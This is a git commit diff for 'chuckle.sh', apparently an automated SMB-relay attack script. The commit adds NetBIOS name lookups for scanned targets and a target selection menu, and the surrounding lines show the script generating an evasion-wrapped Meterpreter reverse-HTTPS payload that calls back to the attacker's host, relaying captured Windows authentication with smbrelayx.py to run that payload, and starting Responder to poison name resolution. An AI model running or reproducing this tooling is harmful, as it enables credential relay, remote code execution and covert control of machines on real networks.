9910050156767e94fa9b6be1739bcb83dd7d1e9d
guly <guly@gulys-mbp.adcgroup.domain>
2015-11-18 17:40:18 +0100

    resolve nbtname
    resolve nbtname of targets

--- chuckle.sh
+++ chuckle.sh
@@ -22,6 +22,10 @@ echo "                                  CSB 2015"
 echo " Automated SMB-Relay Script"
 echo -e '\n'
 
+# print nbt name, slow on big networks
+# valid values: 0 1
+shownbt=1
+
 busy=0
 for port in 21/tcp 25/tcp 53/tcp 80/tcp 88/tcp 110/tcp 139/tcp 143/tcp 1433/tcp 443/tcp 587/tcp 389/tcp 445/tcp 3141/tcp 53/udp 88/udp 137/udp 138/udp 5353/udp 5355/udp; do
   if [ `fuser $port 2>&1 |wc -l` -gt 0 ]; then
@@ -43,16 +47,22 @@ echo > ./chuckle.hosts
 for ip in $(grep open chuckle.gnmap |cut -d " " -f 2 ); do
   lines=$(egrep -A 15 "for $ip$" chuckle.nmap |grep disabled |wc -l)
   if [ $lines -gt 0 ]; then
-    echo "$ip" >> ./chuckle.hosts
+    if [ $shownbt -gt 0 ]; then
+      nbtname=$(nbtscan -e -q $ip | awk -F" " '{print $2}')
+      echo "$ip($nbtname)" >> ./chuckle.hosts
+    else
+      echo "$ip" >> ./chuckle.hosts
+    fi
   fi
 done
 #cat chuckle.hosts |xargs nbtscan -f > chuckle.nbt
 if [[ -s chuckle.hosts ]] ; then
 	echo "Select SMB Relay target:"
 	hosts=$(<chuckle.hosts)
-	select target in $hosts
+	select tmptarget in $hosts
 	do
-		echo "Authentication attempts will be relayed to $target"
+    target=$(echo ${tmptarget%\(*})
+		echo "Authentication attempts will be relayed to $tmptarget"
 		break
 	done
 else 
@@ -74,7 +84,7 @@ payload=$(veil-evasion -p go/meterpreter/rev_https -c LHOST=$lhost LPORT=$port -
 echo "Payload created: $payload"
 echo "Starting SMBRelayX..."
 smbrelayx.py -h $target -e $payload  >> ./chuckle.log  &
-sleep 1
+sleep 2
 echo "Stating Responder..."
 #Old responder
 #responder -i $lhost -wrfF >>chuckle.log &
